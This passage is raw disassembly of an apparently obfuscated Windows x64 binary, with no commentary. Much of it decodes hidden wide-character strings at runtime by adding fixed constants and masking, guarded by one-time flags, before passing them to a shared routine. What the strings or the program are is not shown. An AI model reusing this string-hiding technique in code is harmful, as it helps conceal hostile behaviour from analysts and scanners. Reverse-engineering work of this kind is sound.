   140005292:	00 
   140005293:	66 0f db d1          	pand   %xmm1,%xmm2
   140005297:	66 0f 7f 15 a1 b6 2b 	movdqa %xmm2,0x2bb6a1(%rip)        # 0x1402c0940
   14000529e:	00 
   14000529f:	66 0f 6f 15 a9 b6 2b 	movdqa 0x2bb6a9(%rip),%xmm2        # 0x1402c0950
   1400052a6:	00 
   1400052a7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052ab:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052af:	66 0f 7f 15 99 b6 2b 	movdqa %xmm2,0x2bb699(%rip)        # 0x1402c0950
   1400052b6:	00 
   1400052b7:	66 0f 6f 15 a1 b6 2b 	movdqa 0x2bb6a1(%rip),%xmm2        # 0x1402c0960
   1400052be:	00 
   1400052bf:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052c3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052c7:	66 0f 7f 15 91 b6 2b 	movdqa %xmm2,0x2bb691(%rip)        # 0x1402c0960
   1400052ce:	00 
   1400052cf:	66 0f 6f 15 99 b6 2b 	movdqa 0x2bb699(%rip),%xmm2        # 0x1402c0970
   1400052d6:	00 
   1400052d7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052db:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052df:	66 0f 7f 15 89 b6 2b 	movdqa %xmm2,0x2bb689(%rip)        # 0x1402c0970
   1400052e6:	00 
   1400052e7:	66 0f 6f 15 91 b6 2b 	movdqa 0x2bb691(%rip),%xmm2        # 0x1402c0980
   1400052ee:	00 
   1400052ef:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052f3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052f7:	66 0f 7f 15 81 b6 2b 	movdqa %xmm2,0x2bb681(%rip)        # 0x1402c0980
   1400052fe:	00 
   1400052ff:	66 0f 6f 15 89 b6 2b 	movdqa 0x2bb689(%rip),%xmm2        # 0x1402c0990
   140005306:	00 
   140005307:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000530b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000530f:	66 0f 7f 15 79 b6 2b 	movdqa %xmm2,0x2bb679(%rip)        # 0x1402c0990
   140005316:	00 
   140005317:	66 0f 6f 15 81 b6 2b 	movdqa 0x2bb681(%rip),%xmm2        # 0x1402c09a0
   14000531e:	00 
   14000531f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005323:	66 0f db d1          	pand   %xmm1,%xmm2
   140005327:	66 0f 7f 15 71 b6 2b 	movdqa %xmm2,0x2bb671(%rip)        # 0x1402c09a0
   14000532e:	00 
   14000532f:	66 0f fd 05 79 b6 2b 	paddw  0x2bb679(%rip),%xmm0        # 0x1402c09b0
   140005336:	00 
   140005337:	66 0f db c1          	pand   %xmm1,%xmm0
   14000533b:	66 0f 7f 05 6d b6 2b 	movdqa %xmm0,0x2bb66d(%rip)        # 0x1402c09b0
   140005342:	00 
   140005343:	8b 05 77 b6 2b 00    	mov    0x2bb677(%rip),%eax        # 0x1402c09c0
   140005349:	83 c0 63             	add    $0x63,%eax
   14000534c:	0f b6 c0             	movzbl %al,%eax
   14000534f:	66 89 05 6a b6 2b 00 	mov    %ax,0x2bb66a(%rip)        # 0x1402c09c0
   140005356:	c6 05 65 b6 2b 00 00 	movb   $0x0,0x2bb665(%rip)        # 0x1402c09c2
   14000535d:	80 3d 34 af 2b 00 00 	cmpb   $0x0,0x2baf34(%rip)        # 0x1402c0298
   140005364:	0f 84 64 27 00 00    	je     0x140007ace
   14000536a:	80 3d 81 b6 2b 00 00 	cmpb   $0x0,0x2bb681(%rip)        # 0x1402c09f2
   140005371:	74 56                	je     0x1400053c9
   140005373:	66 0f 6f 05 75 65 00 	movdqa 0x6575(%rip),%xmm0        # 0x14000b8f0
   14000537a:	00 
   14000537b:	66 0f 6f 0d 4d b6 2b 	movdqa 0x2bb64d(%rip),%xmm1        # 0x1402c09d0
   140005382:	00 
   140005383:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140005387:	66 0f 6f 15 91 62 00 	movdqa 0x6291(%rip),%xmm2        # 0x14000b620
   14000538e:	00 
   14000538f:	66 0f db ca          	pand   %xmm2,%xmm1
   140005393:	66 0f 7f 0d 35 b6 2b 	movdqa %xmm1,0x2bb635(%rip)        # 0x1402c09d0
   14000539a:	00 
   14000539b:	66 0f fd 05 3d b6 2b 	paddw  0x2bb63d(%rip),%xmm0        # 0x1402c09e0
   1400053a2:	00 
   1400053a3:	66 0f db c2          	pand   %xmm2,%xmm0
   1400053a7:	66 0f 7f 05 31 b6 2b 	movdqa %xmm0,0x2bb631(%rip)        # 0x1402c09e0
   1400053ae:	00 
   1400053af:	8b 05 3b b6 2b 00    	mov    0x2bb63b(%rip),%eax        # 0x1402c09f0
   1400053b5:	83 c0 63             	add    $0x63,%eax
   1400053b8:	0f b6 c0             	movzbl %al,%eax
   1400053bb:	66 89 05 2e b6 2b 00 	mov    %ax,0x2bb62e(%rip)        # 0x1402c09f0
   1400053c2:	c6 05 29 b6 2b 00 00 	movb   $0x0,0x2bb629(%rip)        # 0x1402c09f2
   1400053c9:	48 8d 0d 70 b5 2b 00 	lea    0x2bb570(%rip),%rcx        # 0x1402c0940
   1400053d0:	48 8d 15 f9 b5 2b 00 	lea    0x2bb5f9(%rip),%rdx        # 0x1402c09d0
   1400053d7:	e8 04 e5 ff ff       	call   0x1400038e0
   1400053dc:	80 3d b6 ae 2b 00 00 	cmpb   $0x0,0x2baeb6(%rip)        # 0x1402c0299
   1400053e3:	0f 84 16 27 00 00    	je     0x140007aff
   1400053e9:	80 3d 8a b6 2b 00 00 	cmpb   $0x0,0x2bb68a(%rip)        # 0x1402c0a7a
   1400053f0:	0f 84 1c 01 00 00    	je     0x140005512
   1400053f6:	66 0f 6f 05 02 65 00 	movdqa 0x6502(%rip),%xmm0        # 0x14000b900
   1400053fd:	00 
   1400053fe:	66 0f 6f 15 fa b5 2b 	movdqa 0x2bb5fa(%rip),%xmm2        # 0x1402c0a00
   140005405:	00 
   140005406:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000540a:	66 0f 6f 0d 0e 62 00 	movdqa 0x620e(%rip),%xmm1        # 0x14000b620
   140005411:	00 
   140005412:	66 0f db d1          	pand   %xmm1,%xmm2
   140005416:	66 0f 7f 15 e2 b5 2b 	movdqa %xmm2,0x2bb5e2(%rip)        # 0x1402c0a00
   14000541d:	00 
   14000541e:	66 0f 6f 15 ea b5 2b 	movdqa 0x2bb5ea(%rip),%xmm2        # 0x1402c0a10
   140005425:	00 
   140005426:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000542a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000542e:	66 0f 7f 15 da b5 2b 	movdqa %xmm2,0x2bb5da(%rip)        # 0x1402c0a10
   140005435:	00 
   140005436:	66 0f 6f 15 e2 b5 2b 	movdqa 0x2bb5e2(%rip),%xmm2        # 0x1402c0a20
   14000543d:	00 
   14000543e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005442:	66 0f db d1          	pand   %xmm1,%xmm2
   140005446:	66 0f 7f 15 d2 b5 2b 	movdqa %xmm2,0x2bb5d2(%rip)        # 0x1402c0a20
   14000544d:	00 
   14000544e:	66 0f 6f 15 da b5 2b 	movdqa 0x2bb5da(%rip),%xmm2        # 0x1402c0a30
   140005455:	00 
   140005456:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000545a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000545e:	66 0f 7f 15 ca b5 2b 	movdqa %xmm2,0x2bb5ca(%rip)        # 0x1402c0a30
   140005465:	00 
   140005466:	66 0f 6f 15 d2 b5 2b 	movdqa 0x2bb5d2(%rip),%xmm2        # 0x1402c0a40
   14000546d:	00 
   14000546e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005472:	66 0f db d1          	pand   %xmm1,%xmm2
   140005476:	66 0f 7f 15 c2 b5 2b 	movdqa %xmm2,0x2bb5c2(%rip)        # 0x1402c0a40
   14000547d:	00 
   14000547e:	66 0f 6f 15 ca b5 2b 	movdqa 0x2bb5ca(%rip),%xmm2        # 0x1402c0a50
   140005485:	00 
   140005486:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000548a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000548e:	66 0f 7f 15 ba b5 2b 	movdqa %xmm2,0x2bb5ba(%rip)        # 0x1402c0a50
   140005495:	00 
   140005496:	66 0f fd 05 c2 b5 2b 	paddw  0x2bb5c2(%rip),%xmm0        # 0x1402c0a60
   14000549d:	00 
   14000549e:	66 0f db c1          	pand   %xmm1,%xmm0
   1400054a2:	66 0f 7f 05 b6 b5 2b 	movdqa %xmm0,0x2bb5b6(%rip)        # 0x1402c0a60
   1400054a9:	00 
   1400054aa:	8b 05 c0 b5 2b 00    	mov    0x2bb5c0(%rip),%eax        # 0x1402c0a70
   1400054b0:	83 c0 3b             	add    $0x3b,%eax
   1400054b3:	0f b6 c0             	movzbl %al,%eax
   1400054b6:	66 89 05 b3 b5 2b 00 	mov    %ax,0x2bb5b3(%rip)        # 0x1402c0a70
   1400054bd:	0f b7 05 ae b5 2b 00 	movzwl 0x2bb5ae(%rip),%eax        # 0x1402c0a72
   1400054c4:	83 c0 3b             	add    $0x3b,%eax
   1400054c7:	0f b6 c0             	movzbl %al,%eax
   1400054ca:	66 89 05 a1 b5 2b 00 	mov    %ax,0x2bb5a1(%rip)        # 0x1402c0a72
   1400054d1:	8b 05 9d b5 2b 00    	mov    0x2bb59d(%rip),%eax        # 0x1402c0a74
   1400054d7:	83 c0 3b             	add    $0x3b,%eax
   1400054da:	0f b6 c0             	movzbl %al,%eax
   1400054dd:	66 89 05 90 b5 2b 00 	mov    %ax,0x2bb590(%rip)        # 0x1402c0a74
   1400054e4:	0f b7 05 8b b5 2b 00 	movzwl 0x2bb58b(%rip),%eax        # 0x1402c0a76
   1400054eb:	83 c0 3b             	add    $0x3b,%eax
   1400054ee:	0f b6 c0             	movzbl %al,%eax
   1400054f1:	66 89 05 7e b5 2b 00 	mov    %ax,0x2bb57e(%rip)        # 0x1402c0a76
   1400054f8:	8b 05 7a b5 2b 00    	mov    0x2bb57a(%rip),%eax        # 0x1402c0a78
   1400054fe:	83 c0 3b             	add    $0x3b,%eax
   140005501:	0f b6 c0             	movzbl %al,%eax
   140005504:	66 89 05 6d b5 2b 00 	mov    %ax,0x2bb56d(%rip)        # 0x1402c0a78
   14000550b:	c6 05 68 b5 2b 00 00 	movb   $0x0,0x2bb568(%rip)        # 0x1402c0a7a
   140005512:	80 3d 81 ad 2b 00 00 	cmpb   $0x0,0x2bad81(%rip)        # 0x1402c029a
   140005519:	0f 84 7e 26 00 00    	je     0x140007b9d
   14000551f:	80 3d 74 b5 2b 00 00 	cmpb   $0x0,0x2bb574(%rip)        # 0x1402c0a9a
   140005526:	74 5a                	je     0x140005582
   140005528:	66 0f 6f 05 50 b5 2b 	movdqa 0x2bb550(%rip),%xmm0        # 0x1402c0a80
   14000552f:	00 
   140005530:	66 0f fd 05 c8 63 00 	paddw  0x63c8(%rip),%xmm0        # 0x14000b900
   140005537:	00 
   140005538:	66 0f db 05 e0 60 00 	pand   0x60e0(%rip),%xmm0        # 0x14000b620
   14000553f:	00 
   140005540:	66 0f 7f 05 38 b5 2b 	movdqa %xmm0,0x2bb538(%rip)        # 0x1402c0a80
   140005547:	00 
   140005548:	f3 0f 7e 05 40 b5 2b 	movq   0x2bb540(%rip),%xmm0        # 0x1402c0a90
   14000554f:	00 
   140005550:	66 0f fd 05 c8 63 00 	paddw  0x63c8(%rip),%xmm0        # 0x14000b920
   140005557:	00 
   140005558:	66 0f db 05 00 61 00 	pand   0x6100(%rip),%xmm0        # 0x14000b660
   14000555f:	00 
   140005560:	66 0f d6 05 28 b5 2b 	movq   %xmm0,0x2bb528(%rip)        # 0x1402c0a90
   140005567:	00 
   140005568:	8b 05 2a b5 2b 00    	mov    0x2bb52a(%rip),%eax        # 0x1402c0a98
   14000556e:	83 c0 3b             	add    $0x3b,%eax
   140005571:	0f b6 c0             	movzbl %al,%eax
   140005574:	66 89 05 1d b5 2b 00 	mov    %ax,0x2bb51d(%rip)        # 0x1402c0a98
   14000557b:	c6 05 18 b5 2b 00 00 	movb   $0x0,0x2bb518(%rip)        # 0x1402c0a9a
   140005582:	48 8d 0d 77 b4 2b 00 	lea    0x2bb477(%rip),%rcx        # 0x1402c0a00
   140005589:	48 8d 15 f0 b4 2b 00 	lea    0x2bb4f0(%rip),%rdx        # 0x1402c0a80
   140005590:	e8 4b e3 ff ff       	call   0x1400038e0
   140005595:	80 3d ff ac 2b 00 00 	cmpb   $0x0,0x2bacff(%rip)        # 0x1402c029b
   14000559c:	0f 84 51 26 00 00    	je     0x140007bf3
   1400055a2:	80 3d 69 b5 2b 00 00 	cmpb   $0x0,0x2bb569(%rip)        # 0x1402c0b12
   1400055a9:	0f 84 ce 00 00 00    	je     0x14000567d
   1400055af:	66 0f 6f 05 79 63 00 	movdqa 0x6379(%rip),%xmm0        # 0x14000b930
   1400055b6:	00 
   1400055b7:	66 0f 6f 15 e1 b4 2b 	movdqa 0x2bb4e1(%rip),%xmm2        # 0x1402c0aa0
   1400055be:	00 
   1400055bf:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055c3:	66 0f 6f 0d 55 60 00 	movdqa 0x6055(%rip),%xmm1        # 0x14000b620
   1400055ca:	00 
   1400055cb:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055cf:	66 0f 7f 15 c9 b4 2b 	movdqa %xmm2,0x2bb4c9(%rip)        # 0x1402c0aa0
   1400055d6:	00 
   1400055d7:	66 0f 6f 15 d1 b4 2b 	movdqa 0x2bb4d1(%rip),%xmm2        # 0x1402c0ab0
   1400055de:	00 
   1400055df:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055e3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055e7:	66 0f 7f 15 c1 b4 2b 	movdqa %xmm2,0x2bb4c1(%rip)        # 0x1402c0ab0
   1400055ee:	00 
   1400055ef:	66 0f 6f 15 c9 b4 2b 	movdqa 0x2bb4c9(%rip),%xmm2        # 0x1402c0ac0
   1400055f6:	00 
   1400055f7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055fb:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055ff:	66 0f 7f 15 b9 b4 2b 	movdqa %xmm2,0x2bb4b9(%rip)        # 0x1402c0ac0
   140005606:	00 
   140005607:	66 0f 6f 15 c1 b4 2b 	movdqa 0x2bb4c1(%rip),%xmm2        # 0x1402c0ad0
   14000560e:	00 
   14000560f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005613:	66 0f db d1          	pand   %xmm1,%xmm2
   140005617:	66 0f 7f 15 b1 b4 2b 	movdqa %xmm2,0x2bb4b1(%rip)        # 0x1402c0ad0
   14000561e:	00 
   14000561f:	66 0f 6f 15 b9 b4 2b 	movdqa 0x2bb4b9(%rip),%xmm2        # 0x1402c0ae0
   140005626:	00 
   140005627:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000562b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000562f:	66 0f 7f 15 a9 b4 2b 	movdqa %xmm2,0x2bb4a9(%rip)        # 0x1402c0ae0
   140005636:	00 
   140005637:	66 0f 6f 15 b1 b4 2b 	movdqa 0x2bb4b1(%rip),%xmm2        # 0x1402c0af0
   14000563e:	00 
   14000563f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005643:	66 0f db d1          	pand   %xmm1,%xmm2
   140005647:	66 0f 7f 15 a1 b4 2b 	movdqa %xmm2,0x2bb4a1(%rip)        # 0x1402c0af0
   14000564e:	00 
   14000564f:	66 0f fd 05 a9 b4 2b 	paddw  0x2bb4a9(%rip),%xmm0        # 0x1402c0b00
   140005656:	00 
   140005657:	66 0f db c1          	pand   %xmm1,%xmm0
   14000565b:	66 0f 7f 05 9d b4 2b 	movdqa %xmm0,0x2bb49d(%rip)        # 0x1402c0b00
   140005662:	00 
   140005663:	8b 05 a7 b4 2b 00    	mov    0x2bb4a7(%rip),%eax        # 0x1402c0b10
   140005669:	83 c0 15             	add    $0x15,%eax
   14000566c:	0f b6 c0             	movzbl %al,%eax
   14000566f:	66 89 05 9a b4 2b 00 	mov    %ax,0x2bb49a(%rip)        # 0x1402c0b10
   140005676:	c6 05 95 b4 2b 00 00 	movb   $0x0,0x2bb495(%rip)        # 0x1402c0b12
   14000567d:	80 3d 18 ac 2b 00 00 	cmpb   $0x0,0x2bac18(%rip)        # 0x1402c029c
   140005684:	0f 84 02 26 00 00    	je     0x140007c8c
   14000568a:	80 3d a1 b4 2b 00 00 	cmpb   $0x0,0x2bb4a1(%rip)        # 0x1402c0b32
   140005691:	74 3a                	je     0x1400056cd
   140005693:	66 0f 6f 05 85 b4 2b 	movdqa 0x2bb485(%rip),%xmm0        # 0x1402c0b20
   14000569a:	00 
   14000569b:	66 0f fd 05 8d 62 00 	paddw  0x628d(%rip),%xmm0        # 0x14000b930
   1400056a2:	00 
   1400056a3:	66 0f db 05 75 5f 00 	pand   0x5f75(%rip),%xmm0        # 0x14000b620
   1400056aa:	00 
   1400056ab:	66 0f 7f 05 6d b4 2b 	movdqa %xmm0,0x2bb46d(%rip)        # 0x1402c0b20
   1400056b2:	00 
   1400056b3:	8b 05 77 b4 2b 00    	mov    0x2bb477(%rip),%eax        # 0x1402c0b30
   1400056b9:	83 c0 15             	add    $0x15,%eax
   1400056bc:	0f b6 c0             	movzbl %al,%eax
   1400056bf:	66 89 05 6a b4 2b 00 	mov    %ax,0x2bb46a(%rip)        # 0x1402c0b30
   1400056c6:	c6 05 65 b4 2b 00 00 	movb   $0x0,0x2bb465(%rip)        # 0x1402c0b32
   1400056cd:	48 8d 0d cc b3 2b 00 	lea    0x2bb3cc(%rip),%rcx        # 0x1402c0aa0
   1400056d4:	48 8d 15 45 b4 2b 00 	lea    0x2bb445(%rip),%rdx        # 0x1402c0b20
   1400056db:	e8 00 e2 ff ff       	call   0x1400038e0
   1400056e0:	80 3d b6 ab 2b 00 00 	cmpb   $0x0,0x2babb6(%rip)        # 0x1402c029d
   1400056e7:	0f 84 e4 25 00 00    	je     0x140007cd1
   1400056ed:	80 3d c0 b4 2b 00 00 	cmpb   $0x0,0x2bb4c0(%rip)        # 0x1402c0bb4
   1400056f4:	0f 84 e6 00 00 00    	je     0x1400057e0
   1400056fa:	66 0f 6f 05 4e 62 00 	movdqa 0x624e(%rip),%xmm0        # 0x14000b950
   140005701:	00 
   140005702:	66 0f 6f 15 36 b4 2b 	movdqa 0x2bb436(%rip),%xmm2        # 0x1402c0b40
   140005709:	00 
   14000570a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000570e:	66 0f 6f 0d 0a 5f 00 	movdqa 0x5f0a(%rip),%xmm1        # 0x14000b620
   140005715:	00 
   140005716:	66 0f db d1          	pand   %xmm1,%xmm2
   14000571a:	66 0f 7f 15 1e b4 2b 	movdqa %xmm2,0x2bb41e(%rip)        # 0x1402c0b40
   140005721:	00 
   140005722:	66 0f 6f 15 26 b4 2b 	movdqa 0x2bb426(%rip),%xmm2        # 0x1402c0b50
   140005729:	00 
   14000572a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000572e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005732:	66 0f 7f 15 16 b4 2b 	movdqa %xmm2,0x2bb416(%rip)        # 0x1402c0b50
   140005739:	00 
   14000573a:	66 0f 6f 15 1e b4 2b 	movdqa 0x2bb41e(%rip),%xmm2        # 0x1402c0b60
   140005741:	00 
   140005742:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005746:	66 0f db d1          	pand   %xmm1,%xmm2
   14000574a:	66 0f 7f 15 0e b4 2b 	movdqa %xmm2,0x2bb40e(%rip)        # 0x1402c0b60
   140005751:	00 
   140005752:	66 0f 6f 15 16 b4 2b 	movdqa 0x2bb416(%rip),%xmm2        # 0x1402c0b70
   140005759:	00 
   14000575a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000575e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005762:	66 0f 7f 15 06 b4 2b 	movdqa %xmm2,0x2bb406(%rip)        # 0x1402c0b70
   140005769:	00 
   14000576a:	66 0f 6f 15 0e b4 2b 	movdqa 0x2bb40e(%rip),%xmm2        # 0x1402c0b80
   140005771:	00 
   140005772:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005776:	66 0f db d1          	pand   %xmm1,%xmm2
   14000577a:	66 0f 7f 15 fe b3 2b 	movdqa %xmm2,0x2bb3fe(%rip)        # 0x1402c0b80
   140005781:	00 
   140005782:	66 0f 6f 15 06 b4 2b 	movdqa 0x2bb406(%rip),%xmm2        # 0x1402c0b90
   140005789:	00 
   14000578a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000578e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005792:	66 0f 7f 15 f6 b3 2b 	movdqa %xmm2,0x2bb3f6(%rip)        # 0x1402c0b90
   140005799:	00 
   14000579a:	66 0f fd 05 fe b3 2b 	paddw  0x2bb3fe(%rip),%xmm0        # 0x1402c0ba0
   1400057a1:	00 
   1400057a2:	66 0f db c1          	pand   %xmm1,%xmm0
   1400057a6:	66 0f 7f 05 f2 b3 2b 	movdqa %xmm0,0x2bb3f2(%rip)        # 0x1402c0ba0
   1400057ad:	00 
   1400057ae:	b8 cb 00 00 00       	mov    $0xcb,%eax
   1400057b3:	03 05 f7 b3 2b 00    	add    0x2bb3f7(%rip),%eax        # 0x1402c0bb0
   1400057b9:	0f b6 c0             	movzbl %al,%eax
   1400057bc:	66 89 05 ed b3 2b 00 	mov    %ax,0x2bb3ed(%rip)        # 0x1402c0bb0
   1400057c3:	0f b7 05 e8 b3 2b 00 	movzwl 0x2bb3e8(%rip),%eax        # 0x1402c0bb2
   1400057ca:	05 cb 00 00 00       	add    $0xcb,%eax
   1400057cf:	0f b6 c0             	movzbl %al,%eax
   1400057d2:	66 89 05 d9 b3 2b 00 	mov    %ax,0x2bb3d9(%rip)        # 0x1402c0bb2
   1400057d9:	c6 05 d4 b3 2b 00 00 	movb   $0x0,0x2bb3d4(%rip)        # 0x1402c0bb4
   1400057e0:	80 3d b7 aa 2b 00 00 	cmpb   $0x0,0x2baab7(%rip)        # 0x1402c029e
   1400057e7:	0f 84 7e 25 00 00    	je     0x140007d6b
   1400057ed:	80 3d e0 b3 2b 00 00 	cmpb   $0x0,0x2bb3e0(%rip)        # 0x1402c0bd4
   1400057f4:	74 47                	je     0x14000583d
   1400057f6:	66 0f 6f 05 c2 b3 2b 	movdqa 0x2bb3c2(%rip),%xmm0        # 0x1402c0bc0
   1400057fd:	00 
   1400057fe:	66 0f fd 05 4a 61 00 	paddw  0x614a(%rip),%xmm0        # 0x14000b950
   140005805:	00 
   140005806:	66 0f db 05 12 5e 00 	pand   0x5e12(%rip),%xmm0        # 0x14000b620
   14000580d:	00 
   14000580e:	66 0f 7f 05 aa b3 2b 	movdqa %xmm0,0x2bb3aa(%rip)        # 0x1402c0bc0
   140005815:	00 
   140005816:	66 0f 6f 05 b2 b3 2b 	movdqa 0x2bb3b2(%rip),%xmm0        # 0x1402c0bd0
   14000581d:	00 
   14000581e:	66 0f fd 05 4a 61 00 	paddw  0x614a(%rip),%xmm0        # 0x14000b970
   140005825:	00 
   140005826:	66 0f db 05 62 5e 00 	pand   0x5e62(%rip),%xmm0        # 0x14000b690
   14000582d:	00 
   14000582e:	66 0f 7e 05 9a b3 2b 	movd   %xmm0,0x2bb39a(%rip)        # 0x1402c0bd0
   140005835:	00 
   140005836:	c6 05 97 b3 2b 00 00 	movb   $0x0,0x2bb397(%rip)        # 0x1402c0bd4
   14000583d:	48 8d 0d fc b2 2b 00 	lea    0x2bb2fc(%rip),%rcx        # 0x1402c0b40
   140005844:	48 8d 15 75 b3 2b 00 	lea    0x2bb375(%rip),%rdx        # 0x1402c0bc0
   14000584b:	e8 90 e0 ff ff       	call   0x1400038e0
   140005850:	48 8d 8d 40 0e 00 00 	lea    0xe40(%rbp),%rcx
   140005857:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000585d:	31 d2                	xor    %edx,%edx
   14000585f:	e8 7c 4e 00 00       	call   0x14000a6e0
   140005864:	80 3d 34 aa 2b 00 00 	cmpb   $0x0,0x2baa34(%rip)        # 0x1402c029f
   14000586b:	0f 84 40 25 00 00    	je     0x140007db1
   140005871:	80 3d 84 b3 2b 00 00 	cmpb   $0x0,0x2bb384(%rip)        # 0x1402c0bfc
   140005878:	74 67                	je     0x1400058e1
   14000587a:	66 0f 6f 05 5e b3 2b 	movdqa 0x2bb35e(%rip),%xmm0        # 0x1402c0be0
   140005881:	00 
   140005882:	66 0f fd 05 06 61 00 	paddw  0x6106(%rip),%xmm0        # 0x14000b990
   140005889:	00 
   14000588a:	66 0f db 05 8e 5d 00 	pand   0x5d8e(%rip),%xmm0        # 0x14000b620
   140005891:	00 
   140005892:	66 0f 7f 05 46 b3 2b 	movdqa %xmm0,0x2bb346(%rip)        # 0x1402c0be0
   140005899:	00 
   14000589a:	f3 0f 7e 05 4e b3 2b 	movq   0x2bb34e(%rip),%xmm0        # 0x1402c0bf0
   1400058a1:	00 
   1400058a2:	66 0f fd 05 f6 60 00 	paddw  0x60f6(%rip),%xmm0        # 0x14000b9a0
   1400058a9:	00 
   1400058aa:	66 0f db 05 ae 5d 00 	pand   0x5dae(%rip),%xmm0        # 0x14000b660
   1400058b1:	00 
   1400058b2:	66 0f d6 05 36 b3 2b 	movq   %xmm0,0x2bb336(%rip)        # 0x1402c0bf0
   1400058b9:	00 
   1400058ba:	f3 0f 7e 05 36 b3 2b 	movq   0x2bb336(%rip),%xmm0        # 0x1402c0bf8
   1400058c1:	00 
   1400058c2:	66 0f fd 05 e6 60 00 	paddw  0x60e6(%rip),%xmm0        # 0x14000b9b0
   1400058c9:	00 
   1400058ca:	66 0f db 05 be 5d 00 	pand   0x5dbe(%rip),%xmm0        # 0x14000b690
   1400058d1:	00 
   1400058d2:	66 0f 7e 05 1e b3 2b 	movd   %xmm0,0x2bb31e(%rip)        # 0x1402c0bf8
   1400058d9:	00 
   1400058da:	c6 05 1b b3 2b 00 00 	movb   $0x0,0x2bb31b(%rip)        # 0x1402c0bfc
   1400058e1:	4c 8d a5 40 0e 00 00 	lea    0xe40(%rbp),%r12
   1400058e8:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400058ef:	4c 89 e1             	mov    %r12,%rcx
   1400058f2:	e8 f9 4c 00 00       	call   0x14000a5f0
   1400058f7:	48 8d 15 e2 b2 2b 00 	lea    0x2bb2e2(%rip),%rdx        # 0x1402c0be0
   1400058fe:	4c 89 e1             	mov    %r12,%rcx
   140005901:	e8 da 4c 00 00       	call   0x14000a5e0
   140005906:	80 3d 93 a9 2b 00 00 	cmpb   $0x0,0x2ba993(%rip)        # 0x1402c02a0
   14000590d:	0f 84 f5 24 00 00    	je     0x140007e08
   140005913:	80 3d 22 b3 2b 00 00 	cmpb   $0x0,0x2bb322(%rip)        # 0x1402c0c3c
   14000591a:	0f 84 de 00 00 00    	je     0x1400059fe
   140005920:	f3 0f 7e 15 d8 b2 2b 	movq   0x2bb2d8(%rip),%xmm2        # 0x1402c0c00
   140005927:	00 
   140005928:	66 0f 6f 05 90 60 00 	movdqa 0x6090(%rip),%xmm0        # 0x14000b9c0
   14000592f:	00 
   140005930:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005934:	66 0f 6f 0d 24 5d 00 	movdqa 0x5d24(%rip),%xmm1        # 0x14000b660
   14000593b:	00 
   14000593c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005940:	f3 0f 7e 1d c0 b2 2b 	movq   0x2bb2c0(%rip),%xmm3        # 0x1402c0c08
   140005947:	00 
   140005948:	66 0f fd d8          	paddw  %xmm0,%xmm3
   14000594c:	66 0f db d9          	pand   %xmm1,%xmm3
   140005950:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005954:	f3 0f 7f 15 a4 b2 2b 	movdqu %xmm2,0x2bb2a4(%rip)        # 0x1402c0c00
   14000595b:	00 
   14000595c:	f3 0f 7e 15 ac b2 2b 	movq   0x2bb2ac(%rip),%xmm2        # 0x1402c0c10
   140005963:	00 
   140005964:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005968:	66 0f db d1          	pand   %xmm1,%xmm2
   14000596c:	f3 0f 7e 1d a4 b2 2b 	movq   0x2bb2a4(%rip),%xmm3        # 0x1402c0c18
   140005973:	00 
   140005974:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005978:	66 0f db d9          	pand   %xmm1,%xmm3
   14000597c:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005980:	f3 0f 7f 15 88 b2 2b 	movdqu %xmm2,0x2bb288(%rip)        # 0x1402c0c10
   140005987:	00 
   140005988:	f3 0f 7e 15 90 b2 2b 	movq   0x2bb290(%rip),%xmm2        # 0x1402c0c20
   14000598f:	00 
   140005990:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005994:	66 0f db d1          	pand   %xmm1,%xmm2
   140005998:	f3 0f 7e 1d 88 b2 2b 	movq   0x2bb288(%rip),%xmm3        # 0x1402c0c28
   14000599f:	00 
   1400059a0:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400059a4:	66 0f db d9          	pand   %xmm1,%xmm3
   1400059a8:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   1400059ac:	f3 0f 7f 15 6c b2 2b 	movdqu %xmm2,0x2bb26c(%rip)        # 0x1402c0c20
   1400059b3:	00 
